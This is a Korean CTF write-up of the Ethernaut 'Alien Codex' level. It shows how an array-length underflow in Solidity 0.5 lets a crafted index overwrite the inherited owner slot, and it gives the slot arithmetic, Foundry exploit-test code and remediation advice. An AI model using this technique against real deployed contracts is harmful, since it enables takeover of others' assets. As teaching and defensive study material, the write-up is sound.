# 19. Alien Codex

[English](../en/19_AlienCodex.md) | [한국어](19_AlienCodex.md)

## 문제 목표

구버전 배열 동작을 이용해 대상이 상속한 `owner`를 플레이어로 변경합니다.

## 핵심 개념

- Solidity 0.5 산술 언더플로
- 상속과 스토리지 패킹
- 동적 배열 스토리지 주소 계산
- `2^256`을 법으로 하는 산술
- 다중 컴파일러 Foundry 테스트

## 스토리지 배치

대상은 OpenZeppelin Contracts 2.5.1의 `Ownable`을 상속하며 여기에 `_owner`라는 `address` 변수가 있습니다. 파생 컨트랙트는 이어서 `bool`과 동적 배열을 선언합니다.

작은 연속 값은 상속된 스토리지 배치를 포함해 하나의 32바이트 슬롯을 공유할 수 있습니다. 관련 배치는 다음과 같습니다.

| 슬롯 | 저장 내용 |
| :---: | :--- |
| `0` | 하위 20바이트의 `_owner`와 그 뒤에 패킹된 `contact` |
| `1` | `codex.length` |
| `keccak256(1) + i` | `codex[i]` |

동적 배열이 선언된 슬롯에는 길이만 저장됩니다. 원소 데이터의 시작 위치는 다음과 같습니다.

```text
P = keccak256(abi.encode(uint256(1)))
```

## 배열 접근 범위 확장

이 레벨은 산술 언더플로가 자동으로 되돌려지지 않는 Solidity 0.5를 사용합니다.

```solidity
function retract() public contacted {
    codex.length--;
}
```

`makeContact()` 후 비어 있는 배열에서 `retract()`를 호출하면 길이가 다음과 같이 바뀝니다.

```text
0 - 1 mod 2^256 = 2^256 - 1
```

이제 거의 전체 스토리지 주소 범위가 배열의 유효 인덱스로 취급됩니다.

## 배열 인덱스를 슬롯 0으로 연결

배열 원소 `i`의 저장 슬롯은 다음과 같습니다.

```text
slot(i) = P + i mod 2^256
```

이 슬롯을 0으로 만들려면 다음 식을 만족해야 합니다.

```text
P + i ≡ 0 mod 2^256
i ≡ -P mod 2^256
i = 2^256 - P
```

Solidity 0.8 테스트에서 이 순환 산술을 재현하려면 `unchecked`가 필요합니다.

```solidity
uint256 ownerSlotIndex;
unchecked {
    ownerSlotIndex = 0 - codexDataSlot;
}
```

## owner 값 기록

플레이어 주소를 전체 스토리지 워드의 하위 20바이트에 배치합니다.

```solidity
bytes32 playerAsBytes32 = bytes32(uint256(uint160(player)));
target.revise(ownerSlotIndex, playerAsBytes32);
```

`revise()`는 배열 원소를 기록한다고 해석하지만 계산된 원소 슬롯은 순환해 슬롯 `0`이 됩니다. 이후 `Ownable.owner()`는 하위 20바이트를 새로운 owner로 읽습니다.

0으로 패딩된 전체 워드를 기록하면서 같은 슬롯에 패킹된 `contact` 바이트도 `false`로 지워집니다. 완료 조건에는 영향이 없으며 테스트에서 이 결과도 명시적으로 검증합니다.

## 풀이 흐름

```text
플레이어가 makeContact() 호출
        ↓
비어 있는 Solidity 0.5 배열에서 retract() 호출
        ↓
codex.length가 2^256 - 1로 언더플로
        ↓
P = keccak256(slot 1) 계산
        ↓
index = 2^256 - P 계산
        ↓
codex[index]가 스토리지 슬롯 0을 가리킴
        ↓
플레이어 주소를 32바이트 워드로 기록
        ↓
상속된 owner가 player로 변경
```

## 다중 컴파일러 Foundry 테스트

대상은 Solidity 0.5를 유지하고 테스트는 최신 `forge-std`와 Solidity 0.8을 사용합니다. 따라서 테스트는 구버전 소스를 직접 import하지 않고 별도로 컴파일된 artifact를 최소 인터페이스로 사용합니다.

```solidity
target = IAlienCodex(
    deployCode("19_AlienCodex.sol:AlienCodex")
);
```

최종 검증:

```solidity
assertEq(target.owner(), player);
assertFalse(target.contact());
```

## 문제의 근본 원인

검사되지 않은 배열 길이 언더플로가 제한된 동적 배열을 거의 임의의 스토리지 쓰기 수단으로 바꿉니다. 배열 주소 공식에 특정 인덱스를 적용하면 상속된 권한 슬롯까지 도달할 수 있습니다.

## 권장 개선 방법

- 길이와 인덱스 갱신에 Solidity 0.8 또는 검사된 산술을 사용합니다.
- 배열 길이를 0 아래로 줄이지 않으며 비어 있지 않음을 확인한 뒤 `pop()`을 사용합니다.
- 임의 배열 인덱스를 기록하는 함수를 제한합니다.
- 스토리지 배치를 검토할 때 상속된 변수도 포함합니다.
- 구버전 컨트랙트를 유지한다면 스토리지 불변조건과 경계값을 테스트합니다.
- 호출자 규율에만 의존하지 말고 구버전 코드를 마이그레이션합니다.

## 테스트 실행

```bash
forge test --match-path test/19_AlienCodex.t.sol -vvv
```

## 학습 정리

동적 배열은 모듈러 산술로 인덱스를 스토리지 슬롯에 연결합니다. 구버전 언더플로로 길이 경계가 사라지면 배열 쓰기가 상속된 소유권 데이터를 포함한 다른 상태까지 도달할 수 있습니다.
